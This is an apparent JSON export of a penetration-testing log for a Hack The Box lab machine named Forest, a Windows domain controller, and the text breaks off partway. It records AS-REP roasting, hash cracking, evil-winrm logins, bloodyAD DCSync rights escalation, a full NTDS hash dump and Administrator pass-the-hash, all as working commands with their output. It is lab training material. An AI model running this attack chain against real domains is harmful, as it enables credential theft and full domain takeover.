@@ -1,0 +1,3399 @@
+{
+  "format": "obol-engagement",
+  "version": 1,
+  "exportedAt": 1791774045311,
+  "engagement": {
+    "id": "eng-mv447rqu-pzrs2o",
+    "name": "Forest",
+    "createdAt": 1791740808246,
+    "updatedAt": 1791773966358,
+    "schema": 3,
+    "profile": {
+      "platform": "htb",
+      "machine_type": "",
+      "candidate": "",
+      "osid": "",
+      "scope": [
+        "10.129.105.202"
+      ],
+      "workflow": "balanced"
+    },
+    "params": {
+      "platform": "htb",
+      "target": "10.129.105.202",
+      "scope_defined": true,
+      "lhost": "10.10.14.191",
+      "lhost_iface": "tun0",
+      "username": "Administrator",
+      "password": "",
+      "nthash": "32693b11e6aa90eb43d32c72a07ceea6",
+      "domain": "htb.local"
+    },
+    "targets": [
+      {
+        "id": "t0-mv4497ky",
+        "ip": "10.129.105.202",
+        "hostname": "FOREST",
+        "os": "Windows Server 2016 Standard 14393 x64"
+      }
+    ],
+    "credentials": [
+      {
+        "id": "cred-mv46vmwo-rfoaao",
+        "user": "svc-alfresco",
+        "domain": "htb.local",
+        "secret": "s3rvice",
+        "secretType": "password",
+        "notes": "Discovered via hashcat"
+      }
+    ],
+    "activities": [
+      {
+        "at": 1791773966099,
+        "command": "nxc smb 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\" 2>nul'",
+        "dispatch": "",
+        "source": "paste",
+        "tool": "nxc",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "flag-hunt-root-windows",
+        "produced": [
+          "foothold.windows",
+          "host.os_hint",
+          "host.os_family",
+          "objective.root_flag",
+          "scan.local.interfaces",
+          "scan.local.routes"
+        ],
+        "stdout": "*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami; hostname; ipconfig; type C:\\Users\\Administrator\\Desktop\\root.txt\nhtb\\administrator\nFOREST\n\nWindows IP Configuration\n\n\nEthernet adapter Ethernet0:\n\n   Connection-specific DNS Suffix  . : .htb\n   IPv6 Address. . . . . . . . . . . : dead:beef::6dc2:347b:bcb:e681\n   Link-local IPv6 Address . . . . . : fe80::6dc2:347b:bcb:e681%5\n   IPv4 Address. . . . . . . . . . . : 10.129.105.202\n   Subnet Mask . . . . . . . . . . . : 255.255.0.0\n   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:4ef9%5\n                                       10.129.0.1\n\nTunnel adapter isatap..htb:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : .htb\n3212d65e50aa8080122607a5be3e475c\n",
+        "sample": "*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami; hostname; ipconfig; type C:\\Users\\Administrator\\Desktop\\root.txt\nhtb\\administrator\nFOREST\n\nWindows IP Configuration\n\n\nEthernet adapter Ethernet0:\n\n   Connection-specific DNS Suffix  . : .htb\n   IPv6 Address. . . . . . . . . . . : dead:beef::6dc2:347b:bcb:e681\n   Link-local IPv6 Address . . . . . : fe80::6dc2:347b:bcb:e681%5\n   IPv4 Address."
+      },
+      {
+        "at": 1791773947723,
+        "command": "evil-winrm -i 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6",
+        "dispatch": "evil-winrm -i 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6  evil-winrm -i 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6  Evil-WinRM shell v4.1",
+        "source": "paste",
+        "tool": "evil-winrm",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "flag-hunt-root-windows",
+        "produced": [
+          "winrm.authenticated",
+          "foothold.windows",
+          "credential.validated",
+          "host.os_hint",
+          "host.os_family",
+          "credential.available",
+          "foothold.windows",
+          "host.os_hint",
+          "host.os_family",
+          "access.desktop",
+          "objective.flag_located",
+          "objective.flag_located_root"
+        ],
+        "stdout": "[2026-10-12 02:58:11 UTC] [tun0:10.10.14.191]\n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ evil-winrm -i 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6\n                                        \nEvil-WinRM shell v4.1\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n                                        \nInfo: Connection successful\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> Get-ChildItem 'C:\\Users\\*\\Desktop' -Recurse -Force -Include *root*.txt,*proof*.txt -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName\nC:\\Users\\Administrator\\Desktop\\root.txt",
+        "sample": "[2026-10-12 02:58:11 UTC] [tun0:10.10.14.191]\n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ evil-winrm -i 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6\n                                        \nEvil-WinRM shell v4.1\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module "
+      },
+      {
+        "at": 1791772409860,
+        "command": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "dispatch": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds  nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds  nxc smb",
+        "source": "paste",
+        "tool": "nxc",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "dcsync",
+        "produced": [
+          "host.os_hint",
+          "host.os_family",
+          "ad.domain_known",
+          "ad.base_dn",
+          "host.domain",
+          "host.hostname",
+          "ad.dc_candidate",
+          "smb.signing",
+          "smb.smbv1",
+          "smb.reachable",
+          "smb.null_session",
+          "credential.available",
+          "smb.authenticated",
+          "credential.validated",
+          "hash.ntlm",
+          "credential.candidate",
+          "hash.krbtgt",
+          "loot.ntds",
+          "credential.available",
+          "credential.admin",
+          "access.admin"
+        ],
+        "stdout": "[2026-10-12 02:29:40 UTC] [tun0:10.10.14.191]\n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds\nSMB         10.129.105.202  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)                                                                                      \nSMB         10.129.105.202  445    FOREST           [+] htb.local\\svc-alfresco:s3rvice \nSMB         10.129.105.202  445    FOREST           [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \nSMB         10.129.105.202  445    FOREST           [+] Dumping the NTDS, this could take a while so go grab a redbull...\nSMB         10.129.105.202  445    FOREST           htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::                                                                                                              \nSMB         10.129.105.202  445    FOREST           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                \nSMB         10.129.105.202  445    FOREST           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::                                                                                                                               \nSMB         10.129.105.202  445    FOREST           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                       \nSMB         10.129.105.202  445    FOREST           htb.local\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::                                                                                                                 \nSMB         10.129.105.202  445    FOREST           htb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::                                                                                                                   \nSMB         10.129.105.202  445    FOREST           htb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::                                                                                                              \nSMB         10.129.105.202  445    FOREST           htb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::                                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::                                                                                                                      \nSMB         10.129.105.202  445    FOREST           htb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::                                                                                                                     \nSMB         10.129.105.202  445    FOREST           FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:9c8e0ea7b5039703fa9819a721b40cd0:::                                                                                                                             \nSMB         10.129.105.202  445    FOREST           EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::                                                                                                                             \nSMB         10.129.105.202  445    FOREST           [+] Dumped 33 NTDS hashes to /home/kali/.nxc/logs/ntds/FOREST_10.129.105.202_2026-10-11_223156.ntds of which 30 were added to the database\nSMB         10.129.105.202  445    FOREST           [*] To extract only enabled accounts from the output file, run the following command: \nSMB         10.129.105.202  445    FOREST           [*] grep -iv disabled /home/kali/.nxc/logs/ntds/FOREST_10.129.105.202_2026-10-11_223156.ntds | cut -d ':' -f1\n",
+        "sample": "[2026-10-12 02:29:40 UTC] [tun0:10.10.14.191]\n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds\nSMB         10.129.105.202  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)                                                                             "
+      },
+      {
+        "at": 1791772193687,
+        "command": "bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' add dcsync svc-alfresco",
+        "dispatch": "bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' add dcsync svc-alfresco  bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' add dcsync svc-alfresco",
+        "source": "paste",
+        "tool": "bloodyAD",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "bloodyad-acl",
+        "produced": [
+          "ad.control_paths"
+        ],
+        "stdout": "[2026-10-12 02:29:09 UTC] [tun0:10.10.14.191]\n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' add dcsync svc-alfresco\n[+] svc-alfresco is now able to DCSync\n",
+        "sample": "[2026-10-12 02:29:09 UTC] [tun0:10.10.14.191]\n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' add dcsync svc-alfresco\n[+] svc-alfresco is now able to DCSync\n"
+      },
+      {
+        "at": 1791772163498,
+        "command": "bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' get writable --detail | tee scans/bloodyad-writable.txt",
+        "dispatch": "bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' get writable --detail | tee scans/bloodyad-writable.txt  for g in \"Domain Admins\" \"Enterprise Admins\" \"Administrators\" \"Exchange Windows Permissions\" \"Account Operators\" \"Organization Management\" \"Backup Operators\" \"Server Operators\" \"Dnsadmins\" \"Print Operators\" \"Group Policy Creator Owners\" \"Key Admins\" \"Enterprise Key Admins\"; do bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' add groupMember \"$g\" svc-alfresco 2>/dev/null && echo \"[+] JOINED: $g\"; done",
+        "source": "paste",
+        "tool": "bloodyAD",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "bloodyad-acl",
+        "produced": [
+          "ad.group_joined",
+          "ad.group_joined",
+          "ad.group_joined",
+          "ad.group_joined",
+          "ad.group_joined",
+          "ad.group_joined",
+          "ad.group_joined"
+        ],
+        "stdout": "[2026-10-11 19:02:29 UTC] [tun0:10.10.14.191]\n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ for g in \"Domain Admins\" \"Enterprise Admins\" \"Administrators\" \"Exchange Windows Permissions\" \"Account Operators\" \"Organization Management\" \"Backup Operators\" \"Server Operators\" \"Dnsadmins\" \"Print Operators\" \"Group Policy Creator Owners\" \"Key Admins\" \"Enterprise Key Admins\"; do bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' add groupMember \"$g\" svc-alfresco 2>/dev/null && echo \"[+] JOINED: $g\"; done\n[+] svc-alfresco added to Exchange Windows Permissions\n[+] JOINED: Exchange Windows Permissions\n[+] svc-alfresco added to Organization Management\n[+] JOINED: Organization Management\n[+] svc-alfresco added to Dnsadmins\n[+] JOINED: Dnsadmins\n[+] svc-alfresco added to Group Policy Creator Owners\n[+] JOINED: Group Policy Creator Owners\n[+] svc-alfresco added to Key Admins\n[+] JOINED: Key Admins\n[+] svc-alfresco added to Enterprise Key Admins\n[+] JOINED: Enterprise Key Admins\n",
+        "sample": "[2026-10-11 19:02:29 UTC] [tun0:10.10.14.191]\n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ for g in \"Domain Admins\" \"Enterprise Admins\" \"Administrators\" \"Exchange Windows Permissions\" \"Account Operators\" \"Organization Management\" \"Backup Operators\" \"Server Operators\" \"Dnsadmins\" \"Print Operators\" \"Group Policy Creator Owners\" \"Key Admins\" \"Enterprise Key Admins\"; do bloodyAD -d htb.local --host 1"
+      },
+      {
+        "at": 1791769352038,
+        "command": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "dispatch": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'  evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'  Evil-WinRM shell v4.1",
+        "source": "paste",
+        "tool": "evil-winrm",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "flag-hunt-windows",
+        "produced": [
+          "winrm.authenticated",
+          "foothold.windows",
+          "credential.validated",
+          "host.os_hint",
+          "host.os_family",
+          "credential.available",
+          "foothold.windows",
+          "host.os_hint",
+          "host.os_family",
+          "access.desktop",
+          "objective.local_flag",
+          "objective.flag_located",
+          "scan.local.interfaces",
+          "scan.local.routes"
+        ],
+        "stdout": "[2026-10-12 01:41:40 UTC] [tun0:10.10.14.191]                                                                                    \n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'\n                                        \nEvil-WinRM shell v4.1\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n                                        \nInfo: Connection successful\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents> Get-ChildItem 'C:\\Users\\*\\Desktop' -Recurse -Force -Include user.txt,root.txt -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName\nC:\\Users\\svc-alfresco\\Desktop\\user.txt\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents> hostname; ipconfig; type C:\\Users\\svc-alfresco\\Desktop\\user.txt\nFOREST\n\nWindows IP Configuration\n\n\nEthernet adapter Ethernet0:\n\n   Connection-specific DNS Suffix  . : .htb\n   IPv6 Address. . . . . . . . . . . : dead:beef::6dc2:347b:bcb:e681\n   Link-local IPv6 Address . . . . . : fe80::6dc2:347b:bcb:e681%5\n   IPv4 Address. . . . . . . . . . . : 10.129.105.202\n   Subnet Mask . . . . . . . . . . . : 255.255.0.0\n   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:4ef9%5\n                                       10.129.0.1\n\nTunnel adapter isatap..htb:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : .htb\n8bde969a1628a97b4279f3bcc283ac43\n",
+        "sample": "[2026-10-12 01:41:40 UTC] [tun0:10.10.14.191]                                                                                    \n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'\n                                        \nEvil-WinRM shell v4.1\n                                        \nWarning: Remote path completions is disabled due to ruby lim"
+      },
+      {
+        "at": 1791745280965,
+        "command": "hashcat -m 18200 loot/asrep.hashes /usr/share/wordlists/rockyou.txt",
+        "dispatch": "hashcat -m 18200 loot/asrep.hashes /usr/share/wordlists/rockyou.txt  hashcat -m 18200 loot/asrep.hashes /usr/share/wordlists/rockyou.txt  hashcat (v7.1.2) starting  Host memory allocated for this attack: 514 MB (4920 MB free)  getnpusers",
+        "source": "paste",
+        "tool": "hashcat",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "crack-asrep",
+        "produced": [
+          "hash.asrep",
+          "credential.candidate",
+          "credential.plaintext",
+          "credential.available",
+          "credential.validated"
+        ],
+        "stdout": "┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ hashcat -m 18200 loot/asrep.hashes /usr/share/wordlists/rockyou.txt\nhashcat (v7.1.2) starting\n\nOpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n====================================================================================================================================================\n* Device #01: cpu-haswell-Intel(R) Core(TM) i7-8700 CPU @ 3.20GHz, 1919/3839 MB (1919 MB allocatable), 8MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\nMinimum salt length supported by kernel: 0\nMaximum salt length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nOptimizers applied:\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n\nATTENTION! Pure (unoptimized) backend kernels selected.\nPure kernels can crack longer passwords, but drastically reduce performance.\nIf you want to switch to optimized kernels, append -O to your commandline.\nSee the above message to find out about the exact limits.\n\nWatchdog: Temperature abort trigger set to 90c\n\nHost memory allocated for this attack: 514 MB (4920 MB free)\n\nDictionary cache built:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344392\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n* Runtime...: 1 sec\n\n$krb5asrep$23$svc-alfresco@HTB.LOCAL:3323ca16c65324c9955aea658f803c82$37e55abf1433bac5d32bb14cb5de39089676e971f77045734ecf5ad1bfd988e86a9e88da6ce14d77620dffc94a428a1d447623323adee68f72d7869e7c80e46c22b91d66c4ba4858afd882bd0f88f81cf08b5e7112ac8b03729050cdf98550886b29fbc4463732d2e1d0baf4851ed7102f2184f6e37974f58c8467b89b211d6a447f62e17649c85a31fda70c58f572e2e594cb41fcbe513b3fbffe535573eff08470424c04b885cb5fe66d9b29e1d25f64ab1e0d5e68b901d1ecc4a71893761d63a2a8f9196ed7b948ef14de062d29d8f31d8b44c7e7e5510417f33968301f44924c68b73565:s3rvice\n                                                          \nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)\nHash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:3323ca16c65324...b73565\nTime.Started.....: Sun Oct 11 14:44:54 2026 (2 secs)\nTime.Estimated...: Sun Oct 11 14:44:56 2026 (0 secs)\nKernel.Feature...: Pure Kernel (password length 0-256 bytes)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#01........:  1690.0 kH/s (2.07ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)\nProgress.........: 4087808/14344385 (28.50%)\nRejected.........: 0/4087808 (0.00%)\nRestore.Point....: 4079616/14344385 (28.44%)\nRestore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidate.Engine.: Device Generator\nCandidates.#01...: s9039554h -> s2704081\nHardware.Mon.#01.: Util: 50%\n\nStarted: Sun Oct 11 14:44:10 2026\nStopped: Sun Oct 11 14:44:57 2026\n                                                                                                                                 \n[2026-10-11 18:44:57 UTC] [tun0:10.10.14.191]\n",
+        "sample": "┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ hashcat -m 18200 loot/asrep.hashes /usr/share/wordlists/rockyou.txt\nhashcat (v7.1.2) starting\n\nOpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n=============================================================================================================="
+      },
+      {
+        "at": 1791744226074,
+        "command": "nxc ldap 10.129.105.202 -u loot/users.txt -p '' --asreproast loot/asrep.hashes",
+        "dispatch": "nxc ldap 10.129.105.202 -u loot/users.txt -p '' --asreproast loot/asrep.hashes  nxc ldap 10.129.105.202 -u loot/users.txt -p '' --asreproast loot/asrep.hashes  nxc ldap  getnpusers",
+        "source": "paste",
+        "tool": "nxc",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "asrep-roast",
+        "produced": [
+          "ad.domain_known",
+          "ad.base_dn",
+          "host.domain",
+          "host.hostname",
+          "ad.dc_candidate",
+          "ldap.reachable",
+          "hash.asrep",
+          "credential.candidate",
+          "blocker.access_denied"
+        ],
+        "stdout": "[2026-10-11 18:42:46 UTC] [tun0:10.10.14.191]\n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nxc ldap 10.129.105.202 -u loot/users.txt -p '' --asreproast loot/asrep.hashes\nLDAP        10.129.105.202  389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)                                                                                        \n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\nLDAP        10.129.105.202  389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:3323ca16c65324c9955aea658f803c82$37e55abf1433bac5d32bb14cb5de39089676e971f77045734ecf5ad1bfd988e86a9e88da6ce14d77620dffc94a428a1d447623323adee68f72d7869e7c80e46c22b91d66c4ba4858afd882bd0f88f81cf08b5e7112ac8b03729050cdf98550886b29fbc4463732d2e1d0baf4851ed7102f2184f6e37974f58c8467b89b211d6a447f62e17649c85a31fda70c58f572e2e594cb41fcbe513b3fbffe535573eff08470424c04b885cb5fe66d9b29e1d25f64ab1e0d5e68b901d1ecc4a71893761d63a2a8f9196ed7b948ef14de062d29d8f31d8b44c7e7e5510417f33968301f44924c68b73565",
+        "sample": "[2026-10-11 18:42:46 UTC] [tun0:10.10.14.191]\n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nxc ldap 10.129.105.202 -u loot/users.txt -p '' --asreproast loot/asrep.hashes\nLDAP        10.129.105.202  389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)                                                           "
+      },
+      {
+        "at": 1791744122791,
+        "command": "nxc ldap 10.129.105.202 -u '' -p '' --users | tee scans/ldap-users.txt",
+        "dispatch": "nxc ldap 10.129.105.202 -u '' -p '' --users | tee scans/ldap-users.txt  nxc ldap 10.129.105.202 -u '' -p '' --users | tee scans/ldap-users.txt  nxc ldap",
+        "source": "paste",
+        "tool": "nxc",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "ad-anon-ldap-enum",
+        "produced": [
+          "ad.domain_known",
+          "ad.base_dn",
+          "host.domain",
+          "host.hostname",
+          "ad.dc_candidate",
+          "ldap.reachable",
+          "ad.anonymous_bind",
+          "ad.user_list"
+        ],
+        "stdout": "┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nxc ldap 10.129.105.202 -u '' -p '' --users | tee scans/ldap-users.txt\nLDAP                     10.129.105.202  389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert) \nLDAP                     10.129.105.202  389    FOREST           [+] htb.local\\: \nLDAP                     10.129.105.202  389    FOREST           [*] Enumerated 31 domain users: htb.local\nLDAP                     10.129.105.202  389    FOREST           -Username-                    -Last PW Set-       -BadPW-  -Description-                                               \nLDAP                     10.129.105.202  389    FOREST           Administrator                 2021-08-30 20:51:58 0        Built-in account for administering the computer/domain      \nLDAP                     10.129.105.202  389    FOREST           Guest                         <never>             0        Built-in account for guest access to the computer/domain    \nLDAP                     10.129.105.202  389    FOREST           DefaultAccount                <never>             0        A user account managed by the system.                       \nLDAP                     10.129.105.202  389    FOREST           krbtgt                        2019-09-18 06:53:23 0        Key Distribution Center Service Account                     \nLDAP                     10.129.105.202  389    FOREST           $331000-VK4ADACQNUCA          <never>             0                                                                    \nLDAP                     10.129.105.202  389    FOREST           SM_2c8eef0a09b545acb          <never>             0                                                                    \nLDAP                     